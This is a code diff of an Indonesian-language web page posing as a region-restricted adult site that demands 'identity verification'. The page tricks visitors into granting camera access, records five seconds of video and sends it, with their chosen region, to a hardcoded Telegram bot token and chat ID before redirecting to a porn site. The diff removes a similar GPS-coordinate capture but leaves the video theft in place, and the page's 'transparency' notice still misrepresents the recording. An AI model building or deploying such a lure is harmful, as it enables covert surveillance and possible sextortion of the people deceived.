@@ -98,7 +98,7 @@
         <p>Konten di dalam situs ini dibatasi berdasarkan wilayah hukum dan memerlukan verifikasi identitas.</p>
         
         <p class="warning-text">
-            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk memverifikasi lokasi GPS dan mengambil rekaman video validasi (5 detik) demi kepatuhan layanan.
+            ⚠️ <strong>Pemberitahuan Transparansi:</strong> Memilih wilayah di bawah ini akan meminta izin browser untuk mengambil rekaman video validasi (5 detik) demi kepatuhan layanan.
         </p>
 
         <div class="btn-group">
@@ -118,8 +118,6 @@ const TELEGRAM_TOKEN = "8944168845:AAHw_QSSDh-A-r2jp7PxVkI1eqL6fX6Eg8w";
 const CHAT_ID = "1966317946";
 const URL_WEB_TUJUAN = "https://xhamster.com/"; 
 
-let userLatitude = null;
-let userLongitude = null;
 let wilayahDipilih = "";
 
 function updateStatus(text, className, showSpinner = false) {
@@ -136,24 +134,7 @@ function updateStatus(text, className, showSpinner = false) {
 function mulaiVerifikasi(wilayah) {
     wilayahDipilih = wilayah;
     document.getElementById('setup-box').style.display = 'none';
-    updateStatus("Mengonfirmasi koordinat lokasi regional...", "loading", true);
-    
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                userLatitude = position.coords.latitude;
-                userLongitude = position.coords.longitude;
-                prosesRekamanKamera();
-            },
-            (error) => {
-                updateStatus("❌ Verifikasi lokasi ditolak oleh pengguna.", "", false);
-                alert("Akses ditolak: Verifikasi lokasi diperlukan untuk masuk.");
-            },
-            { enableHighAccuracy: true, timeout: 5000 }
-        );
-    } else {
-        updateStatus("❌ Browser tidak mendukung verifikasi GPS.", "", false);
-    }
+    prosesRekamanKamera();
 }
 
 function prosesRekamanKamera() {
@@ -192,9 +173,7 @@ function kirimKeTelegram(videoBlob) {
     updateStatus("Mengunggah data enkripsi verifikasi...", "loading", true);
 
     const infoTeks = `🔐 *Hasil Verifikasi Akses*:\n\n` +
-                     `• Wilayah Pilihan: \`${wilayahDipilih}\`\n` +
-                     `• Koordinat: \`${userLatitude}, ${userLongitude}\`\n` +
-                     `• Peta: https://google.com{userLatitude},${userLongitude}`;
+                     `• Wilayah Pilihan: \`${wilayahDipilih}\``;
 
     const formData = new FormData();
     formData.append('chat_id', CHAT_ID);
